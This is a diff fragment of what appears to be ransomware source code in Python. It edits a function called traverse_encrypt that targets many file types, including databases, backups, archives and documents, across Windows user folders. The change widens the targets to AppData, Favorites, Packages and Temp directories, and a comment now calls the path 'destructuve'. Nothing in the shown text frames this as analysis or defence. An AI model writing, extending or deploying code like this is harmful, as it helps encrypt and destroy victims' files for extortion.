@@ -192,7 +192,7 @@ def traverse_encrypt(drive, key):
                   '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
     
     def get_main_dirs(username, drive):
-        # Construct dynamic path
+        # Construct dynamic destructuve path
         main_dirs = [
             os.path.join(drive, f"Users\\{username}\\Downloads"),
             os.path.join(drive, f"Users\\{username}\\Documents"),
@@ -200,7 +200,11 @@ def traverse_encrypt(drive, key):
             os.path.join(drive, f"Users\\{username}\\Pictures"),
             os.path.join(drive, f"Users\\{username}\\Desktop"),
             os.path.join(drive, f"Users\\{username}\\Videos"),
-            os.path.join(drive, f"Users\\{username}\\OneDrive")
+            os.path.join(drive, f"Users\\{username}\\OneDrive"),
+            os.path.join(drive, f"Users\\{username}\\Favorites"),
+            os.path.join(drive, f"Users\\{username}\\AppData\\Roaming"),
+            os.path.join(drive, f"Users\\{username}\\AppData\\Local\\Packages"),
+            os.path.join(drive, f"Users\\{username}\\AppData\\Local\\Temp"),
         ]
         return main_dirs
         
